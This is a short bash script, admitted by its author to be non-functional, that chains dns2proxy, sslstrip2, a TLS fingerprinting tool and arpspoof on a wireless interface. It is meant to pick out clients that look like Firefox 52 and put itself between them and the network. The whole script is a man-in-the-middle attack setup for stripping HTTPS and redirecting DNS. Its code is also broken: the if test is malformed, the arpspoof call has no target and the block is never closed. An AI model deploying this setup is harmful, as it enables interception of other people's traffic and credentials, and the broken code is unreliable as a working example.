#!/bin/bash

# this script is not in a functional state
# it resides here as a monument to my sins

sslStripListenPort="10000"
target="Firefox/52"

python ./dns2proxy/dns2proxy.py &
python ./sslstrip2/sslstrip.py -l $sslStripListenPort &
./tls-fingerprinting/fingerprintls/fingerprintls -i wlan0 &

listening | {
	while IFS= read -r line
	do
		if [ echo $line | grep $target]; then
			arpspoof -i wlan0 -t 
	done
}
